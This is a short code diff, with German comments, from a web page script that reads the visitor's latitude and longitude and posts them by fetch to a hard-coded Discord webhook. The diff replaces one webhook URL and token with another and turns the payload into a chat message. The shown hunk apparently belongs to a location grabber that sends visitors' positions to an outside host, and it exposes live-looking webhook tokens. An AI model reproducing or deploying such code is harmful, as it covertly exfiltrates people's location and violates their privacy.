@@ -21,13 +21,12 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
 
-            // Webhook-URL, an die die Daten gesendet werden
-            const webhookUrl = 'https://discord.com/api/webhooks/1406374866839535808/Fy7V05xk8u5zGUyQmz6ek2_wshrYnks_nc-Qk6RvwdY5qL8segzPDzWapXDrWjLEPeLo';
+            // Ihre Discord Webhook-URL
+            const webhookUrl = 'https://discord.com/api/webhooks/1406376415208800326/bq32c4G7gYuEaZvwmELJ4ZOT_bLhUYZAoXRaSz3VESQi6t2CV_Kq8WOah1JJMYgTfoWz';
 
             // Daten im JSON-Format vorbereiten
             const data = JSON.stringify({
-                latitude: latitude,
-                longitude: longitude
+                content: `Latitude: ${latitude}, Longitude: ${longitude}`
             });
 
             // Fetch-Request an den Webhook senden
